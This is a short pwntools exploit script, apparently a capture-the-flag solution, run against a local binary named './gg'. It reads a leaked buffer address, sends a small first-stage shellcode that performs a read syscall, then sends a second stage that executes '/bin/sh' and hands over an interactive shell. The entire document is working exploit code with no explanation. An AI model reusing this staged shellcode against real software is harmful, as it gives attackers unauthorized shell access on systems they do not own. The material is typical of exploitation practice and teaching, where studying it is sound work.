from pwn import *

r = process(["./gg"])

context.arch = "amd64"

buf = int(r.recvline(),16)

r.recvn(0x1000)

r.send(p64(buf))

payload = asm("""
xor rdx,rdx
mov dl,0xff
syscall
nop
""")

r.send(payload)


payload+=asm("""
mov rbx,0x0068732f6e69622f
push rbx
push rsp
pop rdi
xor rsi,rsi
push rsi
pop rdx
push rdx
pop rax
mov al,0x3b
syscall
mov al,0x3c
xor rdi,rdi
syscall
""")


r.send(payload)
r.interactive()
